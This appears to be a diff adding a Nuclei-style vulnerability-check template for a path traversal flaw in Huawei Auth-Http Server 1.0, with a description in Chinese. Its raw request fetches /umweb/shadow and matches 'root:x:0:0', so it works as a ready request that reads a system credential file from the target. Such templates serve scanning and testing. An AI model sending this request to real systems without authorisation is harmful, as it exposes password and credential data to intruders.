@@ -1,0 +1,24 @@
+id: huawei-auth-http-serve-arbitrary-file-read
+
+info:
+  name: 华为 Auth Http Serve 路径遍历漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    Huawei Auth-Http Server 1.0 存在路径遍历漏洞，攻击者可通过构造恶意路径参数实现任意文件读取。
+    该缺陷源于输入验证机制未正确过滤特殊字符序列，导致系统文件访问控制失效。
+  tags: 华为
+
+http:
+- raw:
+  - |
+    GET /umweb/shadow HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
